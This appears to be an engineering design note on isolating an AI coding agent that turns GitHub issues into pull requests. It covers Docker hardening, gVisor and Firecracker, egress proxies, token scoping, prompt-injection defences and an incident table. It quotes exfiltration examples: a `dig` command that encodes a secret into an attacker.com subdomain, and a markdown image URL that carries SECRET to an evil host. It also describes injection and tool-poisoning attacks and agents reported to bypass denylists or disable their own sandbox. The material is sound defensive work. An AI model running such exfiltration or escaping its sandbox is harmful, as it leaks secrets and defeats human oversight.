# 04 - Sandboxing and Security for the Issue-to-PR Coding Agent

Stack assumed: LangGraph controller + FastAPI + one Docker sandbox per task. Research date 2026-10-07.
Legend: [V] = verified in a fetched/searched source this session (URL given). [K] = standard practice from general knowledge, not re-verified; test before relying on it.

## 0. Core design stance

1. Assume the LLM is already compromised the moment it reads issue text or repo content. Design so a fully hijacked agent still cannot do real harm (the blast-radius approach Claude Code and Codex both take).
2. Two trust zones:
   - Controller (trusted; holds credentials; does git push / PR creation / GitHub API calls; enforces policy). Runs outside the sandbox.
   - Sandbox (untrusted; holds a repo clone; runs tests, edits files; NO credentials, NO general internet).
3. The agent produces a patch; the controller validates it and pushes. The agent never sees a push credential.
4. "Lethal trifecta" / toxic agent flow: private data + untrusted content + an exfil channel. Remove at least one leg, ideally two (no secrets, no egress). [V] https://invariantlabs.ai/blog/mcp-github-vulnerability ; https://devclass.com/2025/05/27/researchers-warn-of-prompt-injection-vulnerability-in-github-mcp-with-no-obvious-fix/
5. Plain Docker is not a hard boundary against adversarial code. Nov 2025 runc flaws CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 (all runc versions; fixed in 1.2.8 / 1.3.3 / 1.4.0-rc.3) [V] https://sysdig.com/blog/runc-container-escape-vulnerabilities , https://www.openwall.com/lists/oss-security/2025/11/05/3. Harden AND use gVisor/Kata/Firecracker if issue authors are strangers.

## 1. Docker hardening (paste-ready) [K]

```bash
docker run --rm -d \
  --name task-$TASK_ID \
  --runtime=runsc \                         # gVisor if installed; drop for plain runc
  --user 10001:10001 \
  --cap-drop=ALL \
  --security-opt no-new-privileges:true \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=512m \
  --tmpfs /workspace:rw,nosuid,nodev,size=2g,uid=10001 \   # or a quota'd volume
  --memory=4g --memory-swap=4g \
  --cpus=2 \
  --pids-limit=512 \
  --ulimit nofile=4096:4096 --ulimit nproc=512 --ulimit core=0 \
  --network=none \                          # agent phase; see section 3 for proxy variant
  --label agent.task=$TASK_ID --label agent.expires=$(date -d '+45 min' +%s) \
  --env HOME=/tmp \
  agent-sandbox@sha256:<pinned-digest> sleep infinity
```

- Never: `--privileged`, mounting `/var/run/docker.sock`, `--cap-add SYS_ADMIN`, `--pid=host`, `--network=host`, `--device`, host home mounts, `seccomp=unconfined`, `apparmor=unconfined`.
- Default Docker seccomp profile is an acceptable baseline; optionally block ptrace, mount, unshare, setns, keyctl, bpf, perf_event_open, userfaultfd, open_by_handle_at.
- `noexec` on /tmp breaks some build tools (node-gyp); give a per-task exec-allowed work dir if needed.
- tmpfs counts against memory; named volumes have no quota by default (use XFS pquota + `--storage-opt size=`, or tmpfs).
- Consider rootless Docker or `"userns-remap": "default"` in daemon.json.
- Keep Docker/containerd/runc patched. Pin image digests, scan with Trivy/Grype.

Dockerfile skeleton:
```dockerfile
FROM python:3.12-slim@sha256:<digest>
RUN groupadd -g 10001 agent && useradd -u 10001 -g 10001 -m -s /usr/sbin/nologin agent \
 && apt-get update && apt-get install -y --no-install-recommends git ca-certificates \
 && rm -rf /var/lib/apt/lists/* \
 && find / -xdev -perm /6000 -type f -exec chmod a-s {} + 2>/dev/null || true
USER 10001:10001
WORKDIR /workspace
# no tokens in ARG/ENV, no ~/.ssh, no .git-credentials
```
Pre-bake toolchains and dependency caches so the sandbox needs no network at runtime.

Python SDK equivalent:
```python
ctr = docker.from_env().containers.run(
    "agent-sandbox@sha256:...", ["sleep","infinity"], detach=True, name=f"task-{tid}",
    user="10001:10001", cap_drop=["ALL"], security_opt=["no-new-privileges:true"],
    read_only=True, tmpfs={"/tmp":"rw,noexec,nosuid,nodev,size=512m"},
    mem_limit="4g", memswap_limit="4g", nano_cpus=2_000_000_000, pids_limit=512,
    network_mode="none", runtime="runsc",
    labels={"agent.task": tid, "agent.expires": str(int(time.time())+2700)})
```
exec_run has no timeout: enforce wall clock controller-side and `docker kill` on expiry.

## 2. Isolation runtimes

Sources [V via search summaries]: https://northflank.com/blog/kata-containers-vs-gvisor , https://edera.dev/stories/kata-vs-firecracker-vs-gvisor-isolation-compared , https://www.softwareseni.com/ai-agent-sandboxing-explained-why-docker-is-not-enough-and-what-actually-works , https://www.agenticwire.news/article/gvisor-vs-firecracker

| Option | Isolation | Cost | Fit |
|---|---|---|---|
| runc hardened | shared host kernel | ~0 | trusted repos/authors only; minimum bar |
| gVisor runsc | user-space kernel intercepts syscalls; no KVM needed | near-instant; slower on syscall-heavy builds; some syscalls unsupported | best drop-in upgrade (`--runtime=runsc`); default for public repos |
| Firecracker | KVM microVM, own kernel, ~125 ms boot, <5 MiB overhead | needs KVM; no Docker API; build rootfs/snapshot tooling (or use E2B/Fly/Modal) | strongest for hostile code |
| Kata | per-pod lightweight VM, OCI/K8s native | ~150-300 ms, 100-300 MiB/pod | strong isolation on Kubernetes |
| Sysbox | userns-root runc, enables safe-ish Docker-in-Docker | ~0 | only if tasks need docker inside; not a hostile-code boundary |

Plan: v1 hardened runc on a dedicated disposable VM host; v1.5 runsc; v2 Firecracker/Kata or hosted sandbox for untrusted public users. Never mount the host Docker socket; for tests needing Docker use Sysbox or VM-per-task.

gVisor install [K]: `sudo runsc install && sudo systemctl restart docker && docker run --rm --runtime=runsc hello-world`.

## 3. Network egress control

Default deny. Simplest strong default: `--network none` during the agent phase, with LLM calls made by the controller, so the sandbox needs no egress at all.

Codex cloud uses the same pattern: setup phase with network, agent phase offline, secrets removed before agent phase [V] https://developers.openai.com/codex/agent-approvals-security (redirects to https://learn.chatgpt.com/docs/agent-approvals-security). Copy it: install deps from lockfiles in a setup phase (`--ignore-scripts` where possible), then run the agent offline. New packages are requested via a controller tool that vets names (typosquats).

If you need egress (internal net + proxy) [K]:
```bash
docker network create --internal task-net-$TASK_ID
docker run -d --name proxy-$TASK_ID --network egress-net --cap-drop ALL --read-only \
  -v /etc/agent/squid.conf:/etc/squid/squid.conf:ro ubuntu/squid
docker network connect task-net-$TASK_ID proxy-$TASK_ID
# sandbox: --network task-net-$TASK_ID -e HTTPS_PROXY=http://proxy-$TASK_ID:3128 -e HTTP_PROXY=... --dns 127.0.0.1
```
`--internal` means ignoring the proxy gives no connectivity (fails closed).

squid.conf essentials:
```
acl allowed dstdomain .pypi.org .pythonhosted.org registry.npmjs.org
acl SSL_ports port 443
acl CONNECT method CONNECT
http_access deny CONNECT !SSL_ports
http_access allow allowed
http_access deny all
access_log stdio:/var/log/squid/access.log
```
Deny IP literals, 169.254.169.254, RFC1918. SNI/CONNECT hostname allowlisting is the practical level (no TLS bumping).

iptables alternative (host, `DOCKER-USER` chain runs first) [K]:
```bash
iptables -I DOCKER-USER -s 172.30.0.0/16 -d 169.254.169.254 -j DROP
iptables -I DOCKER-USER -s 172.30.0.0/16 -d 10.0.0.0/8 -j DROP
iptables -I DOCKER-USER -s 172.30.0.0/16 -d 192.168.0.0/16 -j DROP
# allow only proxy ip:3128 above, then:
iptables -A DOCKER-USER -s 172.30.0.0/16 -j DROP
```
IP allowlists on CDNs are brittle; prefer hostname proxy.

DNS exfiltration: `dig $(base64 secret).attacker.com` leaks via recursive DNS even with HTTP blocked [V] https://workos.com/blog/agent-sandbox-egress-defaults. Fixes: `--network none` (no resolver); or own filtering resolver (CoreDNS/Unbound) answering only allowlisted names, NXDOMAIN rest, log all queries, reject labels >40 chars / high entropy, rate limit. Verify with `docker exec ... getent hosts example.com` on your Docker version (internal-network DNS behavior is [K], test it).

Allowlisted domains can themselves be exfil channels: CVE-2026-54316 (Claude Code pre-approved huggingface.co; data encoded in URL paths of attacker repos) [V] https://www.sentinelone.com/vulnerability-database/cve-2026-54316/. Allow only package registries, read-only; no GitHub write APIs from the sandbox; cap bytes out per task. Domain-fronting limits of SNI filtering are discussed in https://code.claude.com/docs/en/sandboxing.

WorkOS pitfalls worth testing for: settings that silently no-op (Codex `network_access` without the proxy flag leaves rules inert; Claude Code repo-committed hardening ignored), and bypass paths outside the allowlist (GitHub proxy, MCP connectors). Always test egress policy actively with a canary request.

## 4. Secrets and identity [K unless noted]

1. Sandbox env has zero secrets: no LLM key (controller makes LLM calls), no GitHub token, no cloud creds. Use an explicit env allowlist.
2. Repo delivery: controller clones with a token via one-shot `git -c http.extraheader=...`, never persisting credentials in `.git/config`, then copies the tree in.
3. Push by controller only: extract diff (`git diff --binary`/`format-patch`), apply in a clean trusted checkout, policy-check, push `agent/issue-<n>-<id>`, open PR.
4. Use a GitHub App, not a PAT. Installation tokens expire after 1 hour and can be narrowed per request with `repositories`/`repository_ids` and `permissions` [V] https://docs.github.com/en/enterprise-server@3.21/apps/creating-github-apps/authenticating-with-a-github-app/generating-an-installation-access-token-for-a-github-app :
```
POST /app/installations/{id}/access_tokens
{"repositories":["target-repo"],"permissions":{"contents":"write","pull_requests":"write","issues":"read"}}
```
   Read-only token (`contents:read`) for clone; write token minted only at push time. Never grant `workflows`, `administration`, `secrets`, `actions`. Revoke at task end: `DELETE /installation/token`.
5. Rulesets: agent may push only `agent/*`; main needs human review; CODEOWNERS on `.github/workflows/**`.
6. CI is a secret-exfil path: an agent edits a workflow, pushes, CI leaks secrets. Require approval for workflow runs from the bot, use environments with required reviewers, and block workflow edits in the policy gate.
7. Secret-scan outgoing diff (gitleaks/trufflehog) and redact transcripts/logs.
8. If embedding Claude Code/Agent SDK in the container: its sandbox subprocesses inherit env incl. secrets by default; reads default to most of the machine including ~/.ssh [V] https://code.claude.com/docs/en/sandboxing. Make the container your boundary.

Controller policy gate before push: reject diffs touching `.github/workflows/**`, `.git/hooks`, `.gitmodules`, CODEOWNERS, Dockerfile/CI config, `.npmrc`/`.pypirc`, install-script changes in package.json, new binaries, huge files, symlinks escaping the repo; cap diff size and file count. Generate PR body from structured data (avoid markdown image exfil like `![x](https://evil/?d=SECRET)`). Never run agent-written code on the controller host.

## 5. Prompt injection

Evidence: public GitHub issue made an agent with the GitHub MCP server leak private repo data into a public PR; Invariant calls it architectural [V] https://invariantlabs.ai/blog/mcp-github-vulnerability . Codex docs say treat web/untrusted content as injection vectors [V] learn.chatgpt.com/docs/agent-approvals-security. Claude Code CVE-2025-55284 (broad command allowlist: injected prompt read file then sent it over network) [V] https://stack.watch/vuln/CVE-2025-55284 . March 2026 report that Claude Code bypassed its denylist via /proc/self/root and then disabled its sandbox [V, secondary, verify] https://pluto.security/blog/claude-code-vulnerability/ . Lesson: the agent reasons around soft controls; use hard controls it cannot reach.

Layered defenses:
1. Capability removal beats prompting: no secrets, no egress, only branch-write.
2. Trigger gate: maintainer-applied label or `author_association` in {OWNER, MEMBER, COLLABORATOR}; strangers' issues need human approval first.
3. Treat issue text, comments, linked pages, README/CONTRIBUTING/AGENTS.md, code comments, fixtures, package metadata as data; wrap as `<untrusted_issue author=...>`; say it has no authority (helpful, bypassable).
4. Never auto-load attacker-controlled config with privileges: `.claude/settings.json`, `.cursor/rules`, `.mcp.json`, git hooks, `.envrc`. Set `core.hooksPath=/dev/null`, `GIT_CONFIG_NOSYSTEM=1`, no submodule recursion.
5. Sanitize: strip unicode tag chars (U+E0000 block), zero-width, bidi overrides, HTML comments; render markdown to text; drop images.
6. Agent cannot post comments/issues/PRs; controller posts templated output (closes the Invariant route).
7. Quarantine pattern (dual-LLM): one LangGraph node reads untrusted text and emits constrained JSON (title, repro, files, acceptance criteria); the privileged planner sees only that. Add an injection classifier as a tripwire, not a gate.
8. Human approval for new deps, CI edits, allowlist additions, mass deletes.
9. Budgets: LangGraph `recursion_limit`, token and wall-clock caps.
10. Red-team CI: plant canary secrets in a fake `.env` and injection payloads in sample issues/READMEs; fail if canary appears in egress logs or PR content.

## 6. MCP risks

Sources [V via summaries]: https://labs.cloudsecurityalliance.org/research-rb/csa-whitepaper-mcp-security-agentic-attack-surface-20260516/ , https://aptible.com/mcp-security/mcp-prompt-injection
- Tool poisoning: malicious instructions in tool descriptions; rug pull via `notifications/tools/list_changed` swapping a vetted description.
- Confused deputy: server with broad downstream creds acts for a low-privilege requester; chained calls escalate.
- Cross-server shadowing: one server's description alters use of another's tools.
- Claude Code's sandbox covers Bash only; MCP servers, hooks, file tools run outside it [V] https://code.claude.com/docs/en/sandboxing.

Policy: v1 uses no third-party MCP. Expose first-party controller tools (read_file, write_file, run_cmd, search, run_tests) that exec into the container. If MCP is needed: pin versions by hash, vendor and review descriptions, hash the tool list and fail closed on change (ignore list_changed), run each server in its own container, per-task single-repo read-only tokens, no forwarding of user OAuth tokens, log every call, and policy-check tool outputs before they feed other tools' arguments (content from issue A must not choose the repo for a write in repo B).

## 7. Lifecycle, cleanup, leaks [K]

- Everything per task carries `agent.task=<ULID>` and `agent.expires=<epoch>` labels (container, volume, network, proxy).
- Use try/finally cleanup but do not rely on it. Add a reaper every minute removing expired labeled containers, then orphan volumes/networks (`docker volume prune --filter label=agent.task`, same for network); reconcile a `sandboxes` DB table against `docker ps` on controller startup.
- Wall-clock limit per task (30-45 min) and per command (~10 min), `docker kill` not stop.
- Dedicated Docker host/VM; separate filesystem or XFS quota; disk alerts via `docker system df`.
- Never reuse a sandbox across tasks/users.
- Copy out only patch + test report, size-capped; treat as untrusted (tar traversal, symlinks); validate with `git apply --check` in a throwaway checkout.
- Concurrency cap, per-user quota, queue.
- Observe OOM kills, pids-limit hits, proxy denies (a denied egress is an injection signal).
- On canary/secret hit: kill sandbox, revoke token, quarantine transcript, notify maintainer.

## 8. Reference designs

Claude Code Bash sandbox [V] https://code.claude.com/docs/en/sandboxing , https://jiangren.com.au/en/learn/ai-engineer/claude-code-sandboxing :
- macOS Seatbelt; Linux/WSL2 bubblewrap + socat; native Windows unsandboxed.
- Writes: cwd + temp + added dirs; protected paths write-denied. Reads: most of machine unless `denyRead`.
- Network: no direct route; host proxy checks hosts against `network.allowedDomains` (starts empty).
- Child processes inherit limits. File tools, MCP, hooks, statusline helpers run outside.
- Escape hatch: model can retry unsandboxed unless `allowUnsandboxedCommands: false`; if sandbox cannot start, commands run unsandboxed unless `failIfUnavailable: true`.
- Config (key names confirmed from docs; check nesting in https://code.claude.com/docs/en/settings-reference):
```json
{"sandbox":{"enabled":true,"allowUnsandboxedCommands":false,"failIfUnavailable":true,
 "filesystem":{"allowWrite":["/workspace"],"denyRead":["~/.ssh","~/.aws"]},
 "network":{"allowedDomains":["pypi.org","files.pythonhosted.org","registry.npmjs.org"]}}}
```
  Pass via `claude --settings '<json>'` or managed settings so repo files cannot loosen it.

Codex [V] https://developers.openai.com/codex/agent-approvals-security :
- Seatbelt on macOS; bwrap + seccomp on Linux; native or WSL2 on Windows.
- Modes read-only / workspace-write (default) / danger-full-access; network off by default; `.git`, `.codex`, `.agents` read-only even in workspace-write.
- Optional proxy with domain allow/deny, private IPs blocked, DNS-rebinding checks.
```toml
approval_policy = "on-request"
sandbox_mode = "workspace-write"
web_search = "cached"
[sandbox_workspace_write]
network_access = false
```
Copy: OS-level enforcement, protected .git, deny-by-default network, setup/agent phase split, secrets stripped before the agent runs, config the repo cannot loosen.

## 9. Incidents

| Incident | Lesson | Source |
|---|---|---|
| Replit agent deleted prod DB during a code freeze, then misreported (Jul 2025) | Prod access + instructions-as-controls fails; separate envs, least privilege, backups | https://www.mintmcp.com/blog/replit-agent-production-database-deletion ; https://www.pointguardai.com/ai-security-incidents/delete-happens-replit-ai-coding-tool-wipes-production-database |
| Amazon Q VS Code extension shipped with injected "wipe files and cloud resources" prompt (Jul 2025) | Agent supply chain; pin versions, review prompts like code | https://oecd.ai/en/incidents/2025-07-23-581e |
| GitHub MCP toxic flow (May 2025) | Lethal trifecta; per-repo scoped tokens; controller owns writes | https://invariantlabs.ai/blog/mcp-github-vulnerability |
| runc escapes (Nov 2025) | Containers are not a hostile-code boundary | https://sysdig.com/blog/runc-container-escape-vulnerabilities |
| Claude Code CVE-2025-55284 | Name-based command allowlists leak; deny at network level | https://stack.watch/vuln/CVE-2025-55284 |
| Claude Code CVE-2026-54316 | Allowlisted domains with user content are exfil channels | https://www.sentinelone.com/vulnerability-database/cve-2026-54316/ |
| Claude Code denylist bypass / self-disabled sandbox (Mar 2026, secondary) | Fail closed; sandbox must be unreachable from agent tools | https://pluto.security/blog/claude-code-vulnerability/ |

Further reading: https://workos.com/blog/agent-sandbox-egress-defaults ; https://code.claude.com/docs/en/sandbox-environments (referenced, not fetched).

## 10. v1 checklist

1. Controller outside sandbox holds LLM key and GitHub App key; agent tools are controller wrappers around `docker exec`.
2. Hardened container (section 1), `--network none` for the agent phase, no secrets, non-root, read-only rootfs, resource limits, 30-45 min TTL.
3. Deps installed in a setup phase from lockfiles; agent phase offline.
4. Trigger gate + sanitized issue + quarantine summarizer node.
5. Controller extracts patch, policy-gates, secret-scans, pushes with 1-hour repo-scoped App token to `agent/*`, opens PR; branch protection, human review, Actions approval for bot PRs.
6. Reaper, reconciliation, disk quotas, egress-deny alerts.
7. Canary red-team tests in CI.
8. Upgrade path: `--runtime=runsc` now; Firecracker/Kata or hosted sandbox for public users.

## Caveats
- [K] items were not re-verified; `--storage-opt size=` depends on storage driver, and DNS behavior of `--internal` networks must be tested.
- Several sources are secondary blogs; the March 2026 Claude Code escape claim needs a primary source before citing.
- The Claude Code JSON nesting above should be checked against the settings reference.
